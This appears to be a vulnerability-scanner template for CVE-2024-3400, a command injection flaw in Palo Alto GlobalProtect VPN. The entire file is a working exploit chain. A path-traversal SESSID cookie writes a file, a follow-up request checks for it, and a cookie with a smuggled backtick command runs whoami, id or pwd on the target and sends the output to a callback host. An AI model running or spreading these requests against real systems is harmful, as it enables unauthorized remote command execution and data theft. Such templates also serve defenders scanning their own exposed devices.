id: cve-2024-3400
info:
  author: hexa
  description: Detects command injection vulnerability CVE-2024-3400 in Palo Alto
    GlobalProtect VPN.
  name: Palo Alto GlobalProtect Command Injection
  severity: high
requests:
- extractors:
  - name: file_content
    regex:
    - .*
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: SESSID=../../../var/appweb/sslvpndocs/global-protect/portal/images/{{Filename}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/118.0.0.0 Safari/537.36
  matchers:
  - status:
    - 200
    type: status
  method: POST
  path:
  - '{{BaseURL}}/ssl-vpn/hipreport.esp'
  payloads:
    filename:
    - exploitCheck.exp
- extractors:
  - name: vuln_check
    regex:
    - '403'
    type: regex
  headers:
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/118.0.0.0 Safari/537.36
  matchers:
  - status:
    - 403
    type: status
  method: GET
  path:
  - '{{BaseURL}}/global-protect/portal/images/{{Filename}}'
- extractors:
  - name: cmd_exec
    regex:
    - Success
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/attack782`{{CallbackURL}}?r=$({{Payload}})`
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/118.0.0.0 Safari/537.36
  matchers:
  - type: word
    words:
    - Success
  method: POST
  path:
  - '{{BaseURL}}/ssl-vpn/hipreport.esp'
  payloads:
    payload:
    - whoami
    - id
    - pwd
